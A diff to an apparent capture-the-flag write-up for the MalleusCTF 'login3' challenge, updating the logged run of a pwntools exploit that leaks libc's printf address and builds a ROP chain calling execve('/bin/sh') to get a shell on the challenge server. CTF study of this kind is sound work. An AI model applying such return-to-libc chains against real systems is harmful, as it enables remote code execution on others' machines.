@@ -27,14 +27,14 @@ rop.execve(addr_sh, 0, 0)
 
 ```
 $ python exploit.py r
-[*] 'ctf/writeup/MalleusCTF/login3/login3'
+[*] '/ctf/writeup/MalleusCTF/login3/login3'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 [+] Opening connection to host on port 10003: Done
-[*] 'ctf/writeup/MalleusCTF/login3/libc-2.27.so'
+[*] '/ctf/writeup/MalleusCTF/login3/libc-2.27.so'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
@@ -47,15 +47,16 @@ $ python exploit.py r
 0x0018:         0x400782 main()
 Invalid ID or password
 
-printf: 7f4c9dc8fe80
+printf: 7efe8505ae80
 libc printf 64e80
 [*] Loaded cached gadgets for './libc-2.27.so'
-libc.search(b'/bin/sh').next() 7f4c9dddee9a
-0x0000:   0x7f4c9dc4ee6a pop rsi; ret
-0x0008:              0x0 [arg1] rsi = 0
-0x0010:   0x7f4c9dc4c55f pop rdi; ret
-0x0018:   0x7f4c9dddee9a [arg0] rdi = 139967042809498
-0x0020:   0x7f4c9dd0fe30 execve
+libc.search(b'/bin/sh').next() 7efe851a9e9a
+0x0000:   0x7efe8501755f pop rdi; ret
+0x0008:   0x7efe851a9e9a [arg0] rdi = 139631619907226
+0x0010:   0x7efe851266d9 pop rdx; pop rsi; ret
+0x0018:              0x0 [arg2] rdx = 0
+0x0020:              0x0 [arg1] rsi = 0
+0x0028:   0x7efe850dae30 execve
 [*] Switching to interactive mode
 Invalid ID or password
 $ ls
